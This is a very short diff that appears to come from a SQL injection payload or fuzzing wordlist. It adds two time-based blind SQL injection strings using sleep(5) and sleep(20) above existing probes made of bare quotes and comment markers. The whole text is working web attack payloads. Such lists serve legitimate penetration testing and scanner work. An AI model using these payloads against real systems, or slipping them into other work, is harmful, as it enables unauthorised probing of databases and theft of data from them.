@@ -1,3 +1,5 @@
+' and (select*from(select(sleep(5)))a)-- 
+' and (select*from(select(sleep(20)))a)-- 
 '
 ''
 '--
